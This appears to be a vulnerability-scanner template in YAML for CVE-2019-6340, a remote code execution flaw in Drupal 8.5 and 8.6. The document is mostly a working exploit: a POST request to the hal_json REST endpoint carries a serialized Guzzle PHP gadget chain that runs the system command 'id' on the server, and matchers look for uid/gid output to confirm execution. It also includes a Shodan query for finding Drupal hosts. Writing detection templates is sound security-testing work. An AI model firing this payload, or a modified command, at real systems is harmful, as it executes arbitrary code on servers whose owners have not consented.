id: CVE-2019-6340

info:
  name: Drupal - 远程命令执行(CVE-2019-6340)
  author: madrobot
  severity: high
  description: Drupal 8.5.x before 8.5.11 and Drupal 8.6.x before 8.6.10 V contain certain field types that do not properly sanitize data from non-form sources, which can lead to arbitrary PHP code execution in some cases.
  metadata:
    max-request: 1
    shodan-query: http.component:"drupal"
  tags: drupal

http:
  - method: POST
    path:
      - '{{BaseURL}}/node/1?_format=hal_json'

    body: '{
  "link": [
    {
      "value": "link",
      "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:2:\"id\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
    }
  ],
  "_links": {
    "type": {
      "href": "http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default"
    }
  }
}'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
          - "groups="
        condition: and
        part: body
      - type: status
        status:
          - 200
